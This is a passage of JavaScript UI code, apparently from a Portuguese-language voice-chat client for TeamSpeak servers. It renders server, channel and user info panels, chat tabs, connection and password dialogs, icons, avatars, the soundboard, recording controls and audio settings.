    return (bannerLink && loaded ? linkHtml(bannerLink, bannerImg) : bannerImg) + (bannerImg && !loaded ? imageNoteHtml(bannerImg) : '') +
      `<div class="info-title">${esc(s.name || 'Servidor')}</div>` +
      '<div class="kv">' +
        kv('Nome', esc(s.name) || NONE) +
        kv('Endereço', esc(state.host) || NONE) +
        (s.uid ? kv('UID', `<span class="sel">${esc(s.uid)}</span>`) : '') +
        kv('Versão', esc(s.version) || NONE) +
        kv('Plataforma', esc(s.platform) || NONE) +
        kv('Clientes on-line', state.clients.filter((c) => c.type !== 1).length + (s.maxClients ? ' / ' + Number(s.maxClients) : '')) +
      '</div>' +
      blk('Mensagem de boas-vindas', richBlock(s.welcomeMessage, 'sem mensagem'));
  }

  function channelInfoHtml(ch) {
    const count = state.clients.filter((c) => c.channelId === ch.id).length;
    const flags = [];
    if (ch.isDefault) flags.push('Padrão');
    flags.push(ch.isPermanent ? 'Permanente' : ch.isSemiPermanent ? 'Semipermanente' : 'Temporário');
    if (ch.hasPassword) flags.push('Protegido por senha');
    if (ch.neededTalkPower > 0) flags.push('Moderado (talk power ' + Number(ch.neededTalkPower) + ')');
    return `<div class="info-title">${esc(channelLabel(ch))}</div>` +
      '<div class="kv">' +
        kv('Tópico', ch.topic ? esc(ch.topic) : NONE) +
        kv('Codec', esc(codecName(ch.codec))) +
        kv('Qualidade', esc(ch.codecQuality)) +
        kv('Máx. clientes', ch.maxClients === -1 || ch.maxClients == null ? 'Ilimitado' : esc(ch.maxClients)) +
        kv('Clientes no canal', String(count)) +
        kv('Flags', esc(flags.join(', '))) +
      '</div>' +
      blk('Descrição', richBlock(ch.description, 'sem descrição'));
  }

  function clientInfoHtml(cl) {
    const isSelf = cl.id === state.self.clientId;
    const away = isSelf ? state.self.away : cl.away;
    const awayMsg = isSelf ? state.self.awayMessage : cl.awayMessage;
    const ver = [cl.version, cl.platform].filter(Boolean).join(' ');
    const status = [];
    if (cl.type === 1) status.push('ServerQuery');
    if (isSelf ? state.self.muted : cl.inputMuted) status.push('microfone mutado');
    if (isSelf ? state.self.deafened : cl.outputMuted) status.push('alto-falantes mutados');
    if (cl.isRecording) status.push('gravando');
    const groupList = (cl.groups && cl.groups.length) ? cl.groups : cl.serverGroups.map((name) => ({ name, iconId: 0 }));
    const groups = groupList.length
      ? groupList.map((g) => `<div class="ind">${iconHtml({ id: g.iconId, title: g.name })} ${esc(g.name)}</div>`).join('')
      : `<div class="ind">${NONE}</div>`;
    const ch = findChannel(cl.channelId);
    const vol = clamp(Math.round(cl.volume == null ? 100 : Number(cl.volume) || 0), 0, 200);
    const contact = cl.contact === 'friend' ? '<span class="cmark friend">♥</span> Amigo'
      : cl.contact === 'blocked' ? '<span class="cmark blocked">⊘</span> Bloqueado' : NONE;
    return `<div class="info-title">${esc(cl.nickname)}</div>` +
      '<div class="kv">' +
        kv('Versão', ver ? esc(ver) : NONE) +
        kv('On-line desde', cl.connectedSince > 0 ? `<span data-since="${Number(cl.connectedSince)}"></span>` : NONE) +
        (ch ? kv('Canal', esc(channelLabel(ch))) : '') +
        (cl.country ? kv('País', flagHtml(cl.country) + ' ' + esc(cl.country)) : '') +
        (away ? kv('Ausente', awayMsg ? esc(awayMsg) : 'sim') : '') +
        (status.length ? kv('Status', esc(status.join(', '))) : '') +
        (isSelf ? '' : kv('Volume', `<input type="range" class="cl-vol" min="0" max="200" step="1" value="${vol}" data-client="${Number(cl.id)}" title="Volume desta pessoa só para você"><b class="cl-vol-pct">${vol}%</b>` +
          (cl.mutedLocally ? ' <span class="none">(mutado para mim)</span>' : ''))) +
        (isSelf ? '' : kv('Contato', contact)) +
      '</div>' +
      blk('Grupos do servidor', groups) +
      blk('Grupo do canal', `<div class="ind">${cl.channelGroup ? iconHtml({ id: cl.channelGroupIcon, title: cl.channelGroup }) + ' ' + esc(cl.channelGroup) : NONE}</div>`) +
      (cl.description ? blk('Descrição', richBlock(cl.description, '')) : '') +
      avatarHtml(cl);
  }

  function tickDurations() {
    const now = Date.now();
    $('info').querySelectorAll('[data-since]').forEach((el) => {
      const txt = fmtDuration(now - Number(el.dataset.since));
      if (el.textContent !== txt) el.textContent = txt;
    });
  }

  // ------------------------------------------------------------------ abas e bate-papo
  const tabs = new Map();
  const tabOrder = [];
  let activeTab = 'server';
  const MAX_LINES = 2000;

  function createTab(key, kind, peerId, label) {
    const view = document.createElement('div');
    view.className = 'chat-view';
    view.hidden = true;
    $('chatViews').appendChild(view);
    const tab = { key, kind, peerId: peerId || 0, label, unread: 0, view, stick: true, top: 0 };
    view.addEventListener('scroll', () => {
      if (activeTab !== key || view.hidden) return;
      tab.stick = view.scrollHeight - view.scrollTop - view.clientHeight < 6;
      tab.top = view.scrollTop;
    });
    tabs.set(key, tab);
    tabOrder.push(key);
    return tab;
  }

  function renderTabs() {
    $('tabBar').innerHTML = tabOrder.map((key) => {
      const t = tabs.get(key);
      const ic = t.kind === 'server' ? 'server' : t.kind === 'channel' ? 'channel-on' : 'chat';
      return `<button class="tab${key === activeTab ? ' active' : ''}${t.unread ? ' unread' : ''}" data-tab="${esc(key)}" title="${esc(t.label)}">` +
        icon(ic) + `<span class="tab-label">${esc(t.label)}</span>` +
        (t.unread ? `<span class="badge">${t.unread > 99 ? '99+' : t.unread}</span>` : '') +
        (t.kind === 'private' ? `<span class="tab-close" data-close="${esc(key)}" title="Fechar">${icon('x')}</span>` : '') +
        '</button>';
    }).join('');
  }

  function activateTab(key) {
    const next = tabs.get(key);
    if (!next) return;
    activeTab = key;
    for (const t of tabs.values()) t.view.hidden = t.key !== key;
    next.unread = 0;
    next.view.scrollTop = next.stick ? next.view.scrollHeight : next.top;
    renderTabs();
    updateChatInput();
  }

  function closeTab(key) {
    const t = tabs.get(key);
    if (!t || t.kind !== 'private') return;
    t.view.remove();
    tabs.delete(key);
    tabOrder.splice(tabOrder.indexOf(key), 1);
    if (activeTab === key) activateTab('channel'); else renderTabs();
  }

  function ensurePrivateTab(peerId, peerName) {
    const key = 'p:' + peerId;
    let t = tabs.get(key);
    if (!t) {
      // Cada pessoa que escreve em privado abre uma aba; quem manda é o outro
      // lado. Passando do limite, sai a mais antiga que não está em uso.
      const priv = tabOrder.filter((k) => tabs.get(k).kind === 'private' && k !== activeTab);
      if (priv.length >= MAX_PRIVATE_TABS) closeTab(priv[0]);
      t = createTab(key, 'private', peerId, peerName || 'Cliente ' + peerId);
      renderTabs();
    }
    return t;
  }

  function openPrivateChat(clientId) {
    const cl = findClient(clientId);
    if (!cl || cl.id === state.self.clientId) return;
    const t = ensurePrivateTab(cl.id, cl.nickname);
    activateTab(t.key);
    $('chatInput').focus();
  }

  function updateTabLabels() {
    let changed = false;
    const set = (t, label) => { if (t && label && t.label !== label) { t.label = label; changed = true; } };
    set(tabs.get('server'), state.status === 'connected' ? (state.server.name || 'Servidor') : 'Servidor');
    const cur = findChannel(state.self.channelId);
    set(tabs.get('channel'), state.status === 'connected' && cur ? channelLabel(cur) : 'Canal');
    for (const t of tabs.values()) {
      if (t.kind !== 'private') continue;
      const cl = findClient(t.peerId);
      if (cl) set(t, cl.nickname);
    }
    if (changed) renderTabs();
  }

  const CHAT_BB = { images: 'link', max: 8 * 1024 };
  const MAX_PRIVATE_TABS = 40; // abas de conversa privada abertas ao mesmo tempo
  const seenIds = new Set();
  let lastMsgId = 0; // a mensagem mais recente já posta no bate-papo da aba de servidor à vista
  function appendMessage(m, initial) {
    if (!m) return;
    if (m.id > 0) { if (seenIds.has(m.id)) return; seenIds.add(m.id); if (m.id > lastMsgId) lastMsgId = m.id; }
    let tab;
    if (m.targetMode === 1) tab = ensurePrivateTab(m.peerId, m.peerName || m.invokerName);
    else tab = tabs.get(m.targetMode === 2 ? 'channel' : 'server');

    const hist = !!m.history; // linha do histórico salvo: esmaecida, sem aviso de não lida
    const line = document.createElement('div');
    const t = `<span class="t">&lt;${fmtTime(m.time)}&gt;</span>`;
    if (m.kind === 'chat') {
      line.className = 'line chat' + (m.self ? ' self' : '');
      // conversa: [img] vira só o endereço (a imagem de um desconhecido não carrega sozinha)
      line.innerHTML = `${t} <span class="nick">"${esc(m.invokerName || '?')}"</span>: ${bbcode(m.text, CHAT_BB)}`;
    } else {
      const level = /^(info|success|warn|error)$/.test(m.level) ? m.level : 'info';
      line.className = 'line log lv-' + level;
      // só a mensagem de boas-vindas (m.rich) é BBCode; o resto é texto do app
      // com nomes de terceiros dentro (ver logHtml)
      line.innerHTML = `${icon('info', 'ico')}${t} ${m.rich === true ? bbcode(m.text, CHAT_BB) : logHtml(m.text)}`;
    }

    const view = tab.view;
    const stick = tab.stick;
    if (hist) {
      line.classList.add('hist');
      line.title = 'Histórico de ' + new Date(m.time || Date.now()).toLocaleDateString('pt-BR');
      tab.hasHist = true;
    } else if (tab.hasHist && !tab.histSep) {
      tab.histSep = true;
      const sep = document.createElement('div');
      sep.className = 'hist-sep';
      sep.textContent = '— histórico —';
      view.appendChild(sep);
    }
    view.appendChild(line);
    while (view.childElementCount > MAX_LINES) view.firstElementChild.remove();
    if (tab.key === activeTab) {
      if (stick) view.scrollTop = view.scrollHeight;
    } else if (!initial && !hist && m.kind === 'chat' && !m.self) {
      tab.unread++;
      renderTabs();
    }
  }

  // linha local (erros de chamadas etc.) — não vem do backend
  function localLine(level, text, where) {
    const key = where && tabs.has(where) ? where : 'server';
    const t = tabs.get(key);
    appendMessage({ id: 0, time: Date.now(), kind: 'log', level, text, targetMode: t.kind === 'private' ? 1 : t.kind === 'channel' ? 2 : 0, peerId: t.peerId, peerName: t.label });
  }

  function updateChatInput() {
    const on = state.status === 'connected';
    const input = $('chatInput');
    input.disabled = !on;
    $('emojiBtn').disabled = !on;
  }

  function sendChat() {
    const input = $('chatInput');
    const text = input.value.trim();
    const tab = tabs.get(activeTab);
    if (!text || !tab || state.status !== 'connected') return;
    const mode = tab.kind === 'server' ? 3 : tab.kind === 'channel' ? 2 : 1;
    input.value = '';
    run('SendText', [mode, tab.kind === 'private' ? tab.peerId : 0, text], tab.key);
  }

  // ------------------------------------------------------------------ popovers e menus
  let openPop = null;
  function showPopover(el, anchor, x, y) {
    closePopover();
    el.hidden = false;
    const w = el.offsetWidth, h = el.offsetHeight;
    let left = x || 0, top = y || 0, anchorTop = y || 0;
    if (anchor) {
      const r = anchor.getBoundingClientRect();
      left = r.left; top = r.bottom + 4; anchorTop = r.top;
      anchor.classList.add('open');
    }
    left = clamp(left, 6, Math.max(6, window.innerWidth - w - 6));
    if (top + h > window.innerHeight - 6) top = Math.max(6, anchorTop - h - 4);
    el.style.left = left + 'px';
    el.style.top = top + 'px';
    openPop = { el, anchor: anchor || null };
  }
  function closePopover() {
    if (!openPop) return;
    openPop.el.hidden = true;
    if (openPop.anchor) openPop.anchor.classList.remove('open');
    openPop = null;
  }
  function togglePopover(el, anchor) {
    if (openPop && openPop.el === el) closePopover(); else showPopover(el, anchor);
  }

  // itens: { label, action, disabled, checked } | { sep: true } | { label, items: [...] } (submenu)
  function showContextMenu(x, y, items) { showMenu(items, null, x, y); }

  // ------------------------------------------------------------------ diálogos
  const openModals = [];
  function openModal(el) {
    el.hidden = false;
    if (!openModals.includes(el)) openModals.push(el);
    const dlg = el.querySelector('.dialog');
    if (dlg) moveDialog(dlg, 0, 0); // cada abertura começa centralizada
    closePopover();
  }

  // Os diálogos são painéis dentro da janela do app; arrastando pelo título
  // eles se movem como janelas. O deslocamento fica limitado para o título
  // nunca sair da área visível (senão não haveria como trazê-lo de volta).
  function moveDialog(dlg, dx, dy) {
    dlg.style.transform = '';
    const r = dlg.getBoundingClientRect(); // posição original, sem deslocamento
    const keep = 60; // quanto do título precisa continuar à vista
    dx = clamp(dx, keep - r.right, window.innerWidth - keep - r.left);
    dy = clamp(dy, -r.top, window.innerHeight - 30 - r.top); // o título (28 px + borda) fica inteiro à vista
    dlg.dataset.dx = String(dx);
    dlg.dataset.dy = String(dy);
    dlg.style.transform = dx || dy ? `translate(${dx}px, ${dy}px)` : '';
  }
  function bindDialogDrag() {
    let drag = null;
    document.addEventListener('mousedown', (e) => {
      if (e.button !== 0) return;
      const title = e.target.closest ? e.target.closest('.dlg-title') : null;
      let dlg = title && title.closest('.dialog');
      if (!dlg && e.target.closest && e.target.closest('.sv-head') && !e.target.closest('button')) {
        dlg = $('screenView'); // o painel da tela compartilhada também se arrasta pelo cabeçalho
        if (dlg.classList.contains('max')) return;
      }
      if (!dlg) return;
      drag = { dlg, x: e.clientX, y: e.clientY, dx: Number(dlg.dataset.dx) || 0, dy: Number(dlg.dataset.dy) || 0 };
      dlg.classList.add('dragging');
      e.preventDefault();
    });
    document.addEventListener('mousemove', (e) => {
      if (drag) moveDialog(drag.dlg, drag.dx + e.clientX - drag.x, drag.dy + e.clientY - drag.y);
    });
    const end = () => { if (drag) { drag.dlg.classList.remove('dragging'); drag = null; } };
    document.addEventListener('mouseup', end);
    window.addEventListener('blur', end);
    // a janela do app mudou de tamanho: traz de volta o que ficou para fora
    window.addEventListener('resize', () => {
      document.querySelectorAll('.modal:not([hidden]) .dialog').forEach((dlg) => moveDialog(dlg, Number(dlg.dataset.dx) || 0, Number(dlg.dataset.dy) || 0));
    });
  }
  function closeModal(el) { el.hidden = true; const i = openModals.indexOf(el); if (i !== -1) openModals.splice(i, 1); }

  // conectar
  const conn = { open: false, submitting: false, requested: false, sawConnecting: false, error: '', timer: 0, prefilled: false, newTab: 0 };

  // opts.newTab: já vem marcado "Em nova aba" (menu Conexões → Nova aba).
  async function openConnectDialog(opts) {
    conn.open = true; conn.error = ''; conn.requested = false; conn.sawConnecting = false; conn.newTab = 0;
    // "Em nova aba" só faz sentido com esta aba ocupada; parada, a conexão é nela mesma
    const offer = state.status !== 'disconnected';
    $('cNewTabRow').hidden = !offer;
    $('cNewTab').checked = offer && !!(opts && opts.newTab === true);
    $('cNewTabRow').title = offer ? 'Conecta sem sair de "' + (state.server.name || state.host) + '". Sem marcar, esta aba troca de servidor.' : '';
    openModal($('dlgConnect'));
    updateConnectDialog();
    if (!conn.prefilled) {
      conn.prefilled = true;
      try {
        const s = (await call('GetSettings')) || {};
        if (!$('cHost').value) $('cHost').value = s.host || '';
        if (!$('cNick').value) $('cNick').value = s.nickname || '';
        if (!$('cChannel').value) $('cChannel').value = s.defaultChannel || '';
      } catch (e) { /* sem ajustes salvos */ }
    }
    fillIdentitySelect($('cIdentity'), '');
    $('cIdentity').hidden = $('cIdentityLbl').hidden = (state.identities || []).length < 2;
    conn.identNick = '';
    const host = $('cHost');
    host.focus(); host.select();
  }

  // Lista de identidades num <select>; o primeiro item é "a padrão".
  function fillIdentitySelect(sel, chosen) {
    const list = state.identities || [];
    const def = list.find((x) => x.isDefault);
    sel.innerHTML = `<option value="">Padrão${def ? ' (' + esc(def.name) + ')' : ''}</option>` +
      list.map((x) => `<option value="${esc(x.id)}">${esc(x.name)}</option>`).join('');
    sel.value = chosen && list.some((x) => x.id === chosen) ? chosen : '';
  }
  // Ao escolher uma identidade, o apelido sugerido dela entra no campo — desde
  // que o campo esteja vazio ou ainda com o apelido sugerido pela anterior.
  function onConnectIdentityChange() {
    const list = state.identities || [];
    const id = $('cIdentity').value;
    const ident = id ? list.find((x) => x.id === id) : list.find((x) => x.isDefault);
    const nick = $('cNick');
    if (ident && ident.nickname && (!nick.value.trim() || nick.value === conn.identNick)) {
      nick.value = ident.nickname;
      conn.identNick = ident.nickname;
    }
  }

  function closeConnectDialog() {
    conn.open = false; conn.requested = false; conn.newTab = 0;
    clearTimeout(conn.timer);
    closeModal($('dlgConnect'));
  }

  function updateConnectDialog() {
    if (!conn.open) return;
    const busy = conn.submitting || (conn.requested && state.status === 'connecting');
    $('connectOk').disabled = busy;
    $('connectOk').textContent = busy ? 'Conectando…' : 'Conectar';
    $('connectSpinner').hidden = !busy;
    $('connectError').textContent = busy ? '' : conn.error;
    // a tentativa em nova aba falhou e a aba ficou parada: a próxima é nela mesma
    if (!busy && state.status === 'disconnected') $('cNewTabRow').hidden = true;
  }

  async function submitConnect() {
    if (conn.submitting) return;
    const req = {
      host: $('cHost').value.trim(),
      nickname: $('cNick').value.trim(),
      serverPassword: $('cServerPass').value,
      defaultChannel: $('cChannel').value.trim(),
      channelPassword: $('cChannelPass').value,
      identityId: $('cIdentity').value || '',
    };
    if (!req.host) { conn.error = 'Informe o endereço do servidor.'; updateConnectDialog(); $('cHost').focus(); return; }
    if (req.nickname.length < 3) { conn.error = 'O apelido precisa ter pelo menos 3 caracteres.'; updateConnectDialog(); $('cNick').focus(); return; }
    conn.error = ''; conn.submitting = true; conn.requested = true; conn.sawConnecting = false;
    updateConnectDialog();
    const newTab = !$('cNewTabRow').hidden && $('cNewTab').checked;
    try {
      if (newTab) conn.newTab = Number(await call('ConnectNewTab', req)) || 0; // a aba nova passa a ser a que está à vista
      else await call('Connect', req);
      // caso o backend conecte sem passar por "connecting"
      clearTimeout(conn.timer);
      conn.timer = setTimeout(() => { if (conn.open && conn.requested && state.status === 'connected') closeConnectDialog(); }, 1500);
    } catch (e) {
      conn.error = errText(e);
      conn.requested = false;
    } finally {
      conn.submitting = false;
      updateConnectDialog();
    }
  }

  function connectDialogOnState() {
    if (!conn.open || !conn.requested) { updateConnectDialog(); return; }
    if (state.status === 'connecting') conn.sawConnecting = true;
    else if (state.status === 'connected' && conn.sawConnecting) { closeConnectDialog(); return; }
    else if (state.status === 'disconnected' && (conn.sawConnecting || state.error) && !conn.submitting) {
      conn.error = state.error || 'Não foi possível conectar.';
      conn.requested = false;
    }
    updateConnectDialog();
  }

  // senha do canal
  let pwCallback = null;
  function askPassword(ch, cb) {
    pwCallback = cb;
    $('passwordText').textContent = 'O canal "' + channelLabel(ch) + '" é protegido por senha.';
    $('pwInput').value = '';
    openModal($('dlgPassword'));
    $('pwInput').focus();
  }
  function closePasswordDialog(ok) {
    const cb = pwCallback; pwCallback = null;
    const pw = $('pwInput').value;
    closeModal($('dlgPassword'));
    if (ok && cb) cb(pw);
  }

  // ------------------------------------------------------------------ barra de ferramentas / status
  const VAD_MIN = 50, VAD_MAX = 8000, VAD_LOG = Math.log(VAD_MAX / VAD_MIN);
  const vadPos = (v) => clamp(Math.log(Math.max(v, 1) / VAD_MIN) / VAD_LOG, 0, 1);
  const vadFromPos = (p) => Math.round(VAD_MIN * Math.exp(clamp(p, 0, 1) * VAD_LOG));
  let vadBusyUntil = 0, volBusyUntil = 0, floorBusyUntil = 0;
  // Sensibilidade da detecção de voz: o controle vai de "sem mínimo" (na ponta
  // esquerda) até o topo da escala do medidor.
  const floorPos = (v) => (v > 0 ? vadPos(v) : 0);
  const floorFromPos = (p) => (p <= 0 ? 0 : vadFromPos(p));
  const CALIBRATION_SECONDS = 5;
  let calibration = null; // { left, timer } durante a medida; { text, failed, until } logo depois
  // Ícones padrão do TeamSpeak (grupos de canal e de servidor), desenhados aqui.
  const BUILTIN_ICON = {
    100: ['CA', '#b03a2e', 'Channel Admin'], 200: ['O', '#ca6f1e', 'Operator'], 300: ['SA', '#7b241c', 'Server Admin'],
    500: ['SQ', '#566573', 'Server Query'], 600: ['V', '#1e8449', 'Voice'],
  };
  const iconCache = new Map(); // id → data URL ('' = indisponível)
  const iconPending = new Set();
  const iconTries = new Map();
  let iconTimer = 0;

  function requestIcon(id) {
    if (iconPending.has(id)) return;
    iconPending.add(id);
    call('GetIcon', id).then((url) => iconCache.set(id, url || ''), () => iconCache.set(id, '')).then(() => {
      iconPending.delete(id);
      if (!iconCache.get(id)) {
        // falhou: tenta de novo mais tarde, até 3 vezes por conexão
        const tries = (iconTries.get(id) || 0) + 1;
        iconTries.set(id, tries);
        if (tries < 3) setTimeout(() => { if (iconCache.get(id) === '') { iconCache.delete(id); treeHtml = null; infoHtml = null; renderTree(); renderInfo(); } }, 6000 * tries);
      }
      clearTimeout(iconTimer); // vários ícones chegam juntos: redesenha uma vez só
      iconTimer = setTimeout(() => { treeHtml = null; infoHtml = null; renderTree(); renderInfo(); }, 80);
    });
  }

  // Avatares: a imagem de quem tem avatar vem do backend quando as informações
  // da pessoa são abertas. A chave junta o cliente e a marca do avatar, que
  // muda quando ele troca a imagem.
  const avatarCache = new Map(); // "uid:marca" → data URL ('' = indisponível)
  const avatarPending = new Set();
  function avatarHtml(cl) {
    if (!cl.avatar) return '';
    const key = cl.uid + ':' + cl.avatar;
    const src = avatarCache.get(key);
    if (src === undefined && !avatarPending.has(key)) {
      avatarPending.add(key);
      call('GetAvatar', cl.id).then((url) => avatarCache.set(key, url || ''), () => avatarCache.set(key, '')).then(() => {
        avatarPending.delete(key);
        infoHtml = null;
        renderInfo();
      });
    }
    // mostrado como as imagens das descrições dos canais
    return src ? blk('Avatar', `<div class="desc"><img class="bb-img avatar" src="${esc(src)}" alt="Avatar de ${esc(cl.nickname)}"></div>`) : '';
  }

  function iconHtml(ref) {
    const id = Number(ref && ref.id) || 0;
    if (!id) return '';
    const title = esc((ref && ref.title) || '');
    const b = BUILTIN_ICON[id];
    if (b) return `<span class="gicon builtin" style="background:${b[1]}" title="${title || b[2]}">${b[0]}</span>`;
    const src = iconCache.get(id);
    if (src) return `<img class="gicon" src="${esc(src)}" title="${title}" alt="">`;
    if (src === undefined) requestIcon(id);
    return src === '' ? '' : `<span class="gicon ph" title="${title}"></span>`;
  }

  function flagHtml(cc) {
    cc = String(cc || '').toUpperCase();
    if (!/^[A-Z]{2}$/.test(cc)) return '';
    const flag = String.fromCodePoint(0x1F1E6 + cc.charCodeAt(0) - 65, 0x1F1E6 + cc.charCodeAt(1) - 65);
    return `<span class="gflag" title="${cc}">${flag}</span>`;
  }

  const MIC_MODE = { standard: 'Padrão', wide: 'Espectro amplo', isolation: 'Isolamento de Voz ✓' };
  let fxSig = '', sbSig = null, sbVolBusyUntil = 0, renamingSound = '';

  function effectName(id) {
    const e = (state.audio.effects || []).find((x) => x.id === id);
    return e ? e.name : id;
  }

  // O menu de vozes vem do backend; só é refeito quando a lista muda.
  function renderEffectsMenu() {
    const list = (state.audio.effects && state.audio.effects.length) ? state.audio.effects : [{ id: 'normal', name: 'Normal' }];
    const fx = state.audio.effect || 'normal';
    const sig = list.map((e) => e.id + ':' + e.name).join('|');
    const pop = $('popEffects');
    if (sig !== fxSig) {
      fxSig = sig;
      pop.innerHTML = list.map((e) => `<button class="menu-item" data-effect="${esc(e.id)}"><span class="mi-check"></span>${esc(e.name)}</button>`).join('') +
        '<div class="menu-sep"></div><button class="menu-item" data-action="mictest"><span class="mi-check"></span>Ouvir minha voz (teste)</button>';
    }
    pop.querySelectorAll('.menu-item[data-effect]').forEach((b) => b.classList.toggle('checked', b.dataset.effect === fx));
    const test = pop.querySelector('[data-action="mictest"]');
    if (test) test.classList.toggle('checked', !!state.audio.micTest);
  }

  function renderSoundPads() {
    const list = state.audio.sounds || [];
    const sig = (state.platform || '') + '#' + list.map((x) => [x.id, x.name, x.hotkey || '', x.hotkeyError || ''].join(':')).join('|');
    if (sig === sbSig || renamingSound) return;
    sbSig = sig;
    $('sbPads').innerHTML = list.length ? list.map((x) => {
      const key = x.hotkey ? prettyCombo(x.hotkey) : '';
      const chip = key || x.hotkeyError
        ? `<kbd class="pad-hk${x.hotkeyError ? ' err' : ''}" title="${esc(x.hotkeyError ? 'Atalho não registrado: ' + x.hotkeyError : 'Atalho: ' + key)}">${esc(key || 'atalho?')}</kbd>` : '';
      return `<button class="pad custom" data-sound="${esc(x.id)}" title="${esc(x.name + (key ? ' — atalho ' + key : ''))}"><span>🎵</span><b class="pad-name">${esc(x.name)}</b>${chip}` +
        `<i class="pad-key" data-key="${esc(x.id)}" title="${key ? 'Trocar ou remover o atalho' : 'Definir um atalho'}">${icon('key')}</i>` +
        `<i class="pad-del" data-del="${esc(x.id)}" title="Remover">×</i></button>`;
    }).join('')
      : '<div class="sb-empty">Nenhum som ainda.<br>Clique em "Adicionar arquivos…" ou arraste arquivos de áudio para a janela.</div>';
  }

  // Atalho de um som do soundboard: captura a combinação e, depois, reabre o
  // painel (o diálogo de captura o fecha).
  function soundHotkey(id) {
    const snd = (state.audio.sounds || []).find((x) => x.id === id);
    if (!snd) return;
    captureHotkey('sound:' + id, 'tocar "' + snd.name + '"', {
      current: snd.hotkey || '',
      report: (err) => {
        if (err) localLine('error', 'Atalho de "' + snd.name + '": ' + err);
        showPopover($('popSoundboard'), $('tbSoundboard'));
      },
    });
  }

  function startRenameSound(pad) {
    const id = pad.dataset.sound;
    const nameEl = pad.querySelector('.pad-name');
    if (!nameEl) return;
    renamingSound = id;
    const input = document.createElement('input');
    input.className = 'pad-edit';
    input.maxLength = 40;
    input.value = nameEl.textContent;
    nameEl.replaceWith(input);
    input.focus();
    input.select();
    const finish = (save) => {
      if (renamingSound !== id) return;
      renamingSound = '';
      sbSig = null;
      const v = input.value.trim();
      if (save && v) run('SoundboardRename', [id, v]).then(renderSoundPads); else renderSoundPads();
    };
    input.addEventListener('keydown', (ev) => { ev.stopPropagation(); if (ev.key === 'Enter') finish(true); else if (ev.key === 'Escape') finish(false); });
    input.addEventListener('click', (ev) => ev.stopPropagation());
    input.addEventListener('blur', () => finish(true));
  }

  // Botão de gravar a conversa: vermelho e com o tempo correndo enquanto grava.
  let recTimer = 0;
  function renderRecording() {
    const since = state.self.recordingSince || 0;
    const btn = $('tbRecord');
    btn.disabled = !since && state.status !== 'connected';
    btn.classList.toggle('active', !!since);
    btn.title = since
      ? 'Parar a gravação e salvar (os outros veem que você está gravando)'
      : 'Gravar a conversa — os outros veem o indicador de gravação. Clique direito: abrir a pasta das gravações';
    const tick = () => {
      const s = Math.max(0, Math.floor((Date.now() - since) / 1000));
      $('tbRecordTime').textContent = (s >= 3600 ? Math.floor(s / 3600) + ':' + pad2(Math.floor(s / 60) % 60) : Math.floor(s / 60)) + ':' + pad2(s % 60);
    };
    if (since && !recTimer) recTimer = setInterval(tick, 500);
    if (!since && recTimer) { clearInterval(recTimer); recTimer = 0; }
    if (since) tick(); else $('tbRecordTime').textContent = '';
  }

  function renderChrome() {
    const on = state.status === 'connected';
    $('tbDisconnect').disabled = state.status === 'disconnected';
    $('tbAway').disabled = !on;
    $('tbAway').classList.toggle('active', on && state.self.away);
    $('tbMute').classList.toggle('active', state.self.muted);
    $('tbMute').title = state.self.muted ? 'Ativar microfone' : 'Mutar microfone';
    $('tbDeafen').classList.toggle('active', state.self.deafened);
    $('tbDeafen').title = state.self.deafened ? 'Ativar alto-falantes' : 'Mutar alto-falantes';
    renderRecording();

    renderScreen();

    const fx = state.audio.effect || 'normal';
    $('tbEffects').classList.toggle('fx-on', fx !== 'normal');
    $('tbEffects').title = 'Efeitos de voz (' + effectName(fx) + ')';
    renderEffectsMenu();
    renderSoundPads();

    const au = state.audio;
    const vadMode = au.vadMode === 'level' || au.vadMode === 'ptt' ? au.vadMode : 'auto';
    const nsOn = au.noiseSuppression !== false;
    const nsMode = au.noiseMode === 'classic' ? 'classic' : 'neural';
    $('optNS').checked = nsOn;
    $('nsModeRow').hidden = !nsOn;
    if (document.activeElement !== $('nsMode')) $('nsMode').value = nsMode;
    $('nsHint').hidden = !nsOn;
    $('nsHint').textContent = nsMode === 'neural'
      ? 'Tira o ruído de fundo e a digitação, também enquanto você fala.'
      : 'Tira só o ruído constante (ventilador, chiado).';
    $('optAGC').checked = au.autoGain !== false;
    $('optAEC').checked = !!au.echoCancellation;
    $('optAECRow').hidden = au.echoCancellationAvailable === false;
    $('aecHint').hidden = !au.echoCancellation || au.micMode === 'isolation';
    $('speakerHint').hidden = !!au.echoCancellation || au.echoCancellationAvailable === false ||
      !/alto-falantes|alto falantes|speaker/i.test(au.outputDevice || '');
    $('micModeRow').hidden = !au.echoCancellation || !au.micMode;
    $('micModeName').textContent = MIC_MODE[au.micMode] || 'Padrão';
    $('micModeName').classList.toggle('on', au.micMode === 'isolation');
    $('optNormalize').checked = au.normalizeVoices !== false;
    $('optMicTest').checked = !!au.micTest;
    document.querySelectorAll('input[name="vadMode"]').forEach((r) => { r.checked = r.value === vadMode; });
    $('vadSlider').hidden = vadMode !== 'level';
    $('vadFloorSlider').hidden = vadMode !== 'auto';
    $('vadFloorRow').hidden = vadMode !== 'auto';
    renderFloor(vadMode === 'auto');
    $('vadLevelInfo').hidden = vadMode !== 'level';
    $('vadAutoInfo').hidden = vadMode !== 'auto';
    $('vadPttInfo').hidden = vadMode !== 'ptt';
    $('pttKeyInfo').textContent = state.hotkeys.ptt ? '(' + prettyCombo(state.hotkeys.ptt) + ')' : '(defina a tecla em Ajustes)';
    $('tbCapture').classList.toggle('fx-on', !!au.micTest);
    const packs = au.notifyPacks || [];
    $('optNotify').checked = au.notifySounds !== false && packs.length > 0;
    $('optNotify').disabled = packs.length === 0;
    $('notifyMissing').hidden = packs.length > 0;
    $('notifyPackRow').hidden = packs.length < 2;
    const packSig = packs.map((x) => x.id + ':' + x.name).join('|');
    const sel = $('notifyPack');
    if (sel.dataset.sig !== packSig) {
      sel.dataset.sig = packSig;
      sel.innerHTML = packs.map((x) => `<option value="${esc(x.id)}">${esc(x.name)}</option>`).join('');
    }
    if (document.activeElement !== sel) sel.value = au.notifyPack || '';
    if (Date.now() > sbVolBusyUntil) $('sbVol').value = String(clamp(Math.round(au.soundboardVolume == null ? 80 : au.soundboardVolume), 0, 100));

    const now = Date.now();
    if (now > volBusyUntil) $('volSlider').value = String(clamp(Math.round(state.audio.outputVolume), 0, 100));
    if (now > vadBusyUntil) { $('vadSlider').value = String(Math.round(vadPos(state.audio.vadThreshold) * 1000)); $('vadValue').textContent = String(Math.round(state.audio.vadThreshold)); }
    $('devIn').textContent = state.audio.inputDevice || 'padrão do sistema';
    $('devOut').textContent = state.audio.outputDevice || 'padrão do sistema';
    $('captureWarn').hidden = state.audio.captureAvailable !== false;
